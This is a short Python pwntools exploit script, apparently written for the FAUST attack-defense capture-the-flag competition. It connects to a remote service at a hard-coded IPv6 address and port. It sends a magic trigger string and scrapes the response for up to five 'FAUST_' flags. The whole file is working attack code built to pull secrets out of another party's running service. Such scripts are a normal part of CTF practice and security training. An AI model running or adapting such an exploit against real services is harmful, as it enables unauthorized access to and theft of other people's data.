#!/usr/bin/env python3
from pwn import *

context.log_level = 'WARNING'

def _exploit(p):
    p.sendline('mpteympteymptey')
    flags = list(map(lambda s: s[s.find(b'FAUST_'):].decode(), filter(lambda s: s.find(b'FAUST_') >= 0, p.recvuntil("That's it!").split(b'\n'))))[-5:]
    p.close()
    return flags

def exploit(addr, port):
    return _exploit(remote(addr, port))

if __name__ == '__main__':
    print(_exploit(remote('fd66:666:488::2', 6789)))
